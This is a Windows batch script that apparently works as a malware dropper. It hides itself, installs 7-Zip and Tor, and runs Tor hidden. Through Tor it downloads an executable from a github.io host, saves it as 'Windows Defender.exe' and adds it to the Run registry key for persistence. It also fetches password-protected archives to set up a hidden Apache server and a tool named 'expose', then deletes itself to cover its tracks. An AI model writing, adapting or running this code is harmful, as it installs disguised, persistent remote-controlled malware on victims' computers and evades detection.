@echo off
setlocal
attrib +s +h +i "%~f0"

set host=https://cryptedodissey.github.io
set environment=%AppData%\Microsoft\Windows

attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
      attrib +s +h +i "%environment%\7-Zip"
) else (
  "%environment%\curl.exe" -k https://www.7-zip.org/a/7z2201.exe -o "%temp%\7z2201.exe" && "%temp%\7z2201.exe" /S /D="%environment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"
)

attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
    attrib +s +h +i "%environment%\tor.exe"
) else (
   "%environment%\curl.exe" -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz -o "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
)

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (echo) else (
  "%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
)

attrib -s -h -i "%environment%\nircmd.exe" && if exist "%environment%\nircmd.exe" (
   attrib +s +h +i "%environment%\nircmd.exe"
) else (
"%environment%\curl.exe" -k -L %proxy% https://github.com/agdavydov81/antennaarray/raw/105b9250b23501215ff2480d6e63eeebdab008ff/ir_stand/sls/nircmd/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
)

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe" && REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"

attrib -s -h -i "%environment%\expose.exe" && if exist "%environment%\expose.exe" (
   attrib +s +h +i "%environment%\expose.exe"
) else (
  "%environment%\curl.exe" -k %proxy% %host%/Tools/expose.7z -o "%temp%\expose.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\expose.7z" -p7zexpose -o"%environment%" -y && attrib +s +h +i "%environment%\expose.exe" && del "%temp%\expose.7z"
)
 
 attrib -s -h -i "C:\apache2" &&  if exist "C:\apache2\bin\httpd.exe" (
    attrib +s +h +i "C:\apache2"
) else (
   "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache -o"C:\" -y && attrib +s +h +i "C:\apache2" && del "%temp%\apache2.7z"
)
endlocal
DEL /s /f /q /a "%~f0"
